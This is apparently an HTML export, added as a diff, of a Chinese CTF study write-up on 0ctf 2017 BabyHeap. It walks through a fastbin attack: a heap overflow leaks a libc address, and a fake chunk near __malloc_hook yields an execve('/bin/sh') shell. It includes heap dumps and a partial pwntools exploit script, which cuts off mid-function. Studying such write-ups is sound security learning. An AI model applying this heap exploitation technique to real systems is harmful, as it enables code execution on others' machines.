@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+  <html>
+    <head>
+      <title>第二周_Bill_PWN</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      <link rel="stylesheet" href="file:////home/bill/.atom/packages/markdown-preview-enhanced/node_modules/@shd101wyy/mume/dependencies/katex/katex.min.css">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+      <style> 
+      /**
+ * prism.js Github theme based on GitHub's theme.
+ * @author Sam Clarke
+ */
+code[class*="language-"],
+pre[class*="language-"] {
+  color: #333;
+  background: none;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  line-height: 1.4;
+
+  -moz-tab-size: 8;
+  -o-tab-size: 8;
+  tab-size: 8;
+
+  -webkit-hyphens: none;
+  -moz-hyphens: none;
+  -ms-hyphens: none;
+  hyphens: none;
+}
+
+/* Code blocks */
+pre[class*="language-"] {
+  padding: .8em;
+  overflow: auto;
+  /* border: 1px solid #ddd; */
+  border-radius: 3px;
+  /* background: #fff; */
+  background: #f5f5f5;
+}
+
+/* Inline code */
+:not(pre) > code[class*="language-"] {
+  padding: .1em;
+  border-radius: .3em;
+  white-space: normal;
+  background: #f5f5f5;
+}
+
+.token.comment,
+.token.blockquote {
+  color: #969896;
+}
+
+.token.cdata {
+  color: #183691;
+}
+
+.token.doctype,
+.token.punctuation,
+.token.variable,
+.token.macro.property {
+  color: #333;
+}
+
+.token.operator,
+.token.important,
+.token.keyword,
+.token.rule,
+.token.builtin {
+  color: #a71d5d;
+}
+
+.token.string,
+.token.url,
+.token.regex,
+.token.attr-value {
+  color: #183691;
+}
+
+.token.property,
+.token.number,
+.token.boolean,
+.token.entity,
+.token.atrule,
+.token.constant,
+.token.symbol,
+.token.command,
+.token.code {
+  color: #0086b3;
+}
+
+.token.tag,
+.token.selector,
+.token.prolog {
+  color: #63a35c;
+}
+
+.token.function,
+.token.namespace,
+.token.pseudo-element,
+.token.class,
+.token.class-name,
+.token.pseudo-class,
+.token.id,
+.token.url-reference .token.variable,
+.token.attr-name {
+  color: #795da3;
+}
+
+.token.entity {
+  cursor: help;
+}
+
+.token.title,
+.token.title .token.punctuation {
+  font-weight: bold;
+  color: #1d3e81;
+}
+
+.token.list {
+  color: #ed6a43;
+}
+
+.token.inserted {
+  background-color: #eaffea;
+  color: #55a532;
+}
+
+.token.deleted {
+  background-color: #ffecec;
+  color: #bd2c00;
+}
+
+.token.bold {
+  font-weight: bold;
+}
+
+.token.italic {
+  font-style: italic;
+}
+
+
+/* JSON */
+.language-json .token.property {
+  color: #183691;
+}
+
+.language-markup .token.tag .token.punctuation {
+  color: #333;
+}
+
+/* CSS */
+code.language-css,
+.language-css .token.function {
+  color: #0086b3;
+}
+
+/* YAML */
+.language-yaml .token.atrule {
+  color: #63a35c;
+}
+
+code.language-yaml {
+  color: #183691;
+}
+
+/* Ruby */
+.language-ruby .token.function {
+  color: #333;
+}
+
+/* Markdown */
+.language-markdown .token.url {
+  color: #795da3;
+}
+
+/* Makefile */
+.language-makefile .token.symbol {
+  color: #795da3;
+}
+
+.language-makefile .token.variable {
+  color: #183691;
+}
+
+.language-makefile .token.builtin {
+  color: #0086b3;
+}
+
+/* Bash */
+.language-bash .token.keyword {
+  color: #0086b3;
+}html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#333;background-color:#fff;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#000}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#5c5c5c}html body strong{color:#000}html body del{color:#5c5c5c}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#5c5c5c;border-left:4px solid #d6d6d6}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#d6d6d6;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#000}html body table td,html body table th{border:1px solid #d6d6d6;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#000;background-color:#f0f0f0;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#d6d6d6;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#000;border:1px solid #d6d6d6;border-bottom:2px solid #c7c7c7;padding:2px 4px;background-color:#f0f0f0;border-radius:3px}@media print{html body{background-color:#fff}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#000;page-break-after:avoid}html body blockquote{color:#5c5c5c}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+ 
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview   ">
+      <h2 class="mume-header" id="0ctf-2017-babyheap">0ctf 2017 BabyHeap</h2>
+
+<h3 class="mume-header" id="1-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">1. 题目分析</h3>
+
+<pre data-role="codeBlock" data-info="" class="language-"><code>  Arch:     amd64-64-little
+  RELRO:    Full RELRO
+  Stack:    Canary found
+  NX:       NX enabled
+  PIE:      PIE enabled
+</code></pre><blockquote>
+<p>如果<code>RELRO: Partial RELRO</code>, 有可能是格式化字符串。</p>
+</blockquote>
+<p><strong>结论</strong>: 保护全开，一般是有关堆方面的题。</p>
+<h3 class="mume-header" id="2-%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C">2. 程序运行</h3>
+
+<pre data-role="codeBlock" data-info="" class="language-"><code>===== Baby Heap in 2017 =====
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command:
+</code></pre><p><strong>1. Allocate</strong></p>
+<blockquote>
+<p>分配内存</p>
+</blockquote>
+<p><strong>2. Fill</strong></p>
+<blockquote>
+<p>填充内容，可填充任意字长的内容，漏洞就出在此处。</p>
+</blockquote>
+<p><strong>3. Free</strong></p>
+<blockquote>
+<p>释放内存。</p>
+</blockquote>
+<p><strong>4. Dump</strong></p>
+<blockquote>
+<p>打印内容。</p>
+</blockquote>
+<h3 class="mume-header" id="3-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%80%9F%E9%89%B4%E8%87%AAgd%E5%B8%88%E5%82%85%E7%9A%84%E7%9C%8B%E9%9B%AA%E4%B8%93%E6%A0%8Fhttpsbbspediycomthread-223461htm">3. 漏洞分析（借鉴自<a href="https://bbs.pediy.com/thread-223461.htm">gd师傅的看雪专栏</a>）</h3>
+
+<p><strong>考察知识点 : fastbin attack</strong></p>
+<h4 class="mume-header" id="one-part">One Part</h4>
+
+<blockquote>
+<p>下面这个是理论前提:</p>
+<blockquote>
+<p>利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写能力</p>
+</blockquote>
+</blockquote>
+<p>下面就围绕这点展开论述:</p>
+<ul>
+<li>First Step</li>
+</ul>
+<pre data-role="codeBlock" data-info="" class="language-"><code>alloc(0x60)
+alloc(0x40)
+&#x5BF9;&#x5E94;&#x7684;&#x5185;&#x5B58;:                                           
+0x56144ab7e000:	0x0000000000000000	0x0000000000000071 --&gt; chunk0 header
+0x56144ab7e010:	0x0000000000000000	0x0000000000000000
+0x56144ab7e020:	0x0000000000000000	0x0000000000000000
+0x56144ab7e030:	0x0000000000000000	0x0000000000000000
+0x56144ab7e040:	0x0000000000000000	0x0000000000000000
+0x56144ab7e050:	0x0000000000000000	0x0000000000000000
+0x56144ab7e060:	0x0000000000000000	0x0000000000000000
+0x56144ab7e070:	0x0000000000000000	0x0000000000000051 --&gt; chunk1 header
+0x56144ab7e080:	0x0000000000000000	0x0000000000000000
+0x56144ab7e090:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0a0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0b0:	0x0000000000000000	0x0000000000000000
+</code></pre><ul>
+<li>Second Step</li>
+</ul>
+<pre data-role="codeBlock" data-info="" class="language-"><code>Fill(0x10, 0x60 + 0x10, &quot;A&quot; * 0x60 + p64(0) + p64(0x71)) --&gt; &#x5F00;&#x59CB;&#x7834;&#x574F;chunk1 header
+0x56144ab7e000:	0x0000000000000000	0x0000000000000071
+0x56144ab7e010:	0x6161616161616161	0x6161616161616161
+0x56144ab7e020:	0x6161616161616161	0x6161616161616161
+0x56144ab7e030:	0x6161616161616161	0x6161616161616161
+0x56144ab7e040:	0x6161616161616161	0x6161616161616161
+0x56144ab7e050:	0x6161616161616161	0x6161616161616161
+0x56144ab7e060:	0x6161616161616161	0x6161616161616161
+0x56144ab7e070:	0x0000000000000000	0x0000000000000071  --&gt; &#x5DF2;&#x4FEE;&#x6539;&#x4E3A;0x71
+0x56144ab7e080:	0x0000000000000000	0x0000000000000000
+0x56144ab7e090:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0a0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0b0:	0x0000000000000000	0x0000000000000000
+</code></pre><ul>
+<li>Third Step: 申请<code>small chunk</code></li>
+</ul>
+<pre data-role="codeBlock" data-info="" class="language-"><code>Alloc(0x100)
+0x56144ab7e000:	0x0000000000000000	0x0000000000000071
+0x56144ab7e010:	0x6161616161616161	0x6161616161616161
+0x56144ab7e020:	0x6161616161616161	0x6161616161616161
+0x56144ab7e030:	0x6161616161616161	0x6161616161616161
+0x56144ab7e040:	0x6161616161616161	0x6161616161616161
+0x56144ab7e050:	0x6161616161616161	0x6161616161616161
+0x56144ab7e060:	0x6161616161616161	0x6161616161616161
+0x56144ab7e070:	0x0000000000000000	0x0000000000000071
+0x56144ab7e080:	0x0000000000000000	0x0000000000000000
+0x56144ab7e090:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0a0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0b0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0c0:	0x0000000000000000	0x0000000000000111 --&gt; chunk2 header
+0x56144ab7e0d0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0e0:	0x0000000000000000	0x0000000000000000
+</code></pre><ul>
+<li>Fourth Step: 破坏<code>chunk2 header</code>, 最后目的是释放<code>chunk2</code></li>
+</ul>
+<pre data-role="codeBlock" data-info="" class="language-"><code>Fill(2, 0x20, &apos;c&apos; * 0x10 + p64(0) + p64(0x71)) --&gt; fake chunk header
+Free(1)
+Alloc(0x60)
+0x56144ab7e000:	0x0000000000000000	0x0000000000000071
+0x56144ab7e010:	0x6161616161616161	0x6161616161616161
+0x56144ab7e020:	0x6161616161616161	0x6161616161616161
+0x56144ab7e030:	0x6161616161616161	0x6161616161616161
+0x56144ab7e040:	0x6161616161616161	0x6161616161616161
+0x56144ab7e050:	0x6161616161616161	0x6161616161616161
+0x56144ab7e060:	0x6161616161616161	0x6161616161616161
+0x56144ab7e070:	0x0000000000000000	0x0000000000000071
+0x56144ab7e080:	0x0000000000000000	0x0000000000000000
+0x56144ab7e090:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0a0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0b0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0c0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0d0:	0x0000000000000000	0x0000000000000000
+0x56144ab7e0e0:	0x0000000000000000	0x0000000000000071
+</code></pre><ul>
+<li>Fifth Step: 修复<code>chunk2 header</code>, <code>free</code> 它</li>
+</ul>
+<pre data-role="codeBlock" data-info="" class="language-"><code>Fill(1, 0x40 + 0x10, &apos;b&apos; * 0x60 + p64(0) + p64(0x111)) --&gt; &#x4FEE;&#x590D;chunk2
+Free(2)
+Dump(1)
+0x56144ab7e000:	0x0000000000000000	0x0000000000000071
+0x56144ab7e010:	0x6161616161616161	0x6161616161616161
+0x56144ab7e020:	0x6161616161616161	0x6161616161616161
+0x56144ab7e030:	0x6161616161616161	0x6161616161616161
+0x56144ab7e040:	0x6161616161616161	0x6161616161616161
+0x56144ab7e050:	0x6161616161616161	0x6161616161616161
+0x56144ab7e060:	0x6161616161616161	0x6161616161616161
+0x56144ab7e070:	0x0000000000000000	0x0000000000000071
+0x56144ab7e080:	0x6262626262626262	0x6262626262626262
+0x56144ab7e090:	0x6262626262626262	0x6262626262626262
+0x56144ab7e0a0:	0x6262626262626262	0x6262626262626262
+0x56144ab7e0b0:	0x6262626262626262	0x6262626262626262
+0x56144ab7e0c0:	0x0000000000000000	0x0000000000000111
+0x56144ab7e0d0:	0x00007f26abbacb78	0x00007f26abbacb78 --&gt; &#x6307;&#x5411;libc&#x4E2D;&#x7684;&#x67D0;&#x5730;&#x5740;
+0x56144ab7e0e0:	0x0000000000000000	0x0000000000000071
+</code></pre><p><code>Leak Address</code>总体流程：</p>
+<blockquote>
+<p>申请两个<code>fast chunk</code>, 一个<code>small chunk</code>, 伪造<code>chunk header</code>, 最终目的就是为了是<code>libc</code>的地址出现在某个可打印的<code>chunk</code>块中。</p>
+</blockquote>
+<h4 class="mume-header" id="two-part">Two Part</h4>
+
+<p><strong>如何获取<code>Shell</code>?</strong></p>
+<blockquote>
+<p>malloc_hook 是一个<code>libc</code>上的函数指针，调用<code>malloc</code>时如果该指针不为空则执行它指向的函数，可以通过写<code>malloc_hook</code>来<code>getshell</code></p>
+</blockquote>
+<p><em>思路</em>: Alloc(x), 返回的地址是<code>malloc_hook</code>, 那么我们就可向这个地址写入<code>execve(&quot;/bin/sh&quot;)</code>的地址<br>
+现在<code>fastbin</code>：</p>
+<pre data-role="codeBlock" data-info="" class="language-"><code>[ fb 4 ] 0x7f1017adfb48  -&gt; [ 0x0 ]
+[ fb 5 ] 0x7f1017adfb50  -&gt; [ 0x55b076f6b070 ] (112) --&gt; free chunk2
+[ fb 6 ] 0x7f1017adfb58  -&gt; [ 0x0 ]
+</code></pre><p>执行<code>free(1)</code>, <code>Fill(0, 0x60 + 0x10 + 0x10, payload)</code></p>
+<pre data-role="codeBlock" data-info="" class="language-"><code>[ fb 0 ] 0x7f1017adfb28  -&gt; [ 0x0 ]
+[ fb 1 ] 0x7f1017adfb30  -&gt; [ 0x0 ]
+[ fb 2 ] 0x7f1017adfb38  -&gt; [ 0x0 ]
+[ fb 3 ] 0x7f1017adfb40  -&gt; [ 0x0 ]
+[ fb 4 ] 0x7f1017adfb48  -&gt; [ 0x0 ]
+[ fb 5 ] 0x7f1017adfb50  -&gt; [ 0x55b076f6b070 ] (112)
+                            [ 0x7f1017adfaed ] (112) --&gt; &#x88AB;&#x4FEE;&#x6539;&#x4E3A;&#x4E86;malloc_hook&#x9644;&#x8FD1;&#x7684;&#x5730;&#x5740;
+[ fb 6 ] 0x7f1017adfb58  -&gt; [ 0x0 ]
+[ fb 7 ] 0x7f1017adfb60  -&gt; [ 0x0 ]
+[ fb 8 ] 0x7f1017adfb68  -&gt; [ 0x0 ]
+[ fb 9 ] 0x7f1017adfb70  -&gt; [ 0x0 ]
+</code></pre><p><code>Alloc(0x60) * 2</code>, 第二次返回的就是<code>malloc_hook</code>附近的地址.</p>
+<pre data-role="codeBlock" data-info="" class="language-"><code>Fill(2, length, execve_address),
+Alloc(0x20) --&gt; &#x6267;&#x884C;execve(&quot;/bin/sh&quot;)
+</code></pre><h3 class="mume-header" id="%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98">其他问题:</h3>
+
+<p><strong>1. 这个地址和<code>libc</code>加载的基地址有什么关系?</strong></p>
+<blockquote>
+<p>答: 泄露出来的这个地址与libc之间相差<code>0x3c4b78</code>， 可以使用<code>peda</code>的<code>vmmap</code>来验证.</p>
+</blockquote>
+<pre data-role="codeBlock" data-info="" class="language-"><code>0x55b076f6b0c0:	0x0000000000000000	0x0000000000000111
+0x55b076f6b0d0:	0x00007f1017adfb78	0x00007f1017adfb78
+0x55b076f6b0e0:	0x0000000000000000	0x0000000000000071
+0x55b076f6b0f0:	0x0000000000000000	0x0000000000000000
+--------------------------------------
+0x000055b076f6b000 0x000055b076f8c000 rw-p	[heap]
+0x00007f101771b000 0x00007f10178db000 r-xp	/lib/x86_64-linux-gnu/libc-2.23.so
+0x00007f10178db000 0x00007f1017adb000 ---p	/lib/x86_64-linux-gnu/libc-2.23.so
+</code></pre><p><strong>2. <code>0x71</code>是什么鬼？ 为甚么要填充它?</strong></p>
+<blockquote>
+<p><code>0x71</code> 被称为<code>chunksize</code> ,下面这段代码是<code>malloc.c</code>中的一段代码，如果<code>fastbin_index (chunksize (victim)) != idx</code>， 就会<code>corruption</code>, <code>free</code>的时候也会检查<code>chunksize</code>, 根据<code>chunksize</code>的大小，<code>free</code>相应的空间.</p>
+</blockquote>
+<pre data-role="codeBlock" data-info="c" class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    errstr <span class="token operator">=</span> <span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">;</span>
+errout<span class="token punctuation">:</span>
+    <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> errstr<span class="token punctuation">,</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</pre><p>咱们填充<code>0x71</code>是为了下面<code>alloc(0x60)</code>时，不会崩掉.<br>
+下面给出<code>fastbin_index代码</code>:</p>
+<pre data-role="codeBlock" data-info="c" class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> fastbin_index(sz) \
+  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)</span>
+  相当于 <span class="token punctuation">(</span>chunksize <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span>
+</pre><p><strong>3. 为什么不选择<code>malloc_hook</code>作爲第二次<code>Alloc</code>返回的地址呢?</strong></p>
+<blockquote>
+<p>有下面内容可知, <code>0x7f1017adfaed</code>的<code>chunksize</code>为<code>0x7f</code>, <code>fastbin_index</code>检查时不会出错。<br>
+而<code>malloc_hook</code>处<code>chunksize</code>为0, 马上就会崩掉喽。</p>
+</blockquote>
+<pre data-role="codeBlock" data-info="" class="language-"><code>0x7f1017adfaed &lt;_IO_wide_data_0+301&gt;:	0x1017ade260000000	0x000000000000007f
+0x7f1017adfafd:	0x10177a0e20000000	0x10177a0a0000007f
+0x7f1017adfb0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000
+0x7f1017adfb1d:	0x0000000000000000	0x0000000000000000
+</code></pre><h3 class="mume-header" id="exp">EXP</h3>
+
+<pre data-role="codeBlock" data-info="python" class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
+
+DEBUG <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">if</span> DEBUG<span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyheap'</span><span class="token punctuation">)</span>
+    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">alloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Size:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Command:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Index:'</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: \n'</span><span class="token punctuation">)</span>
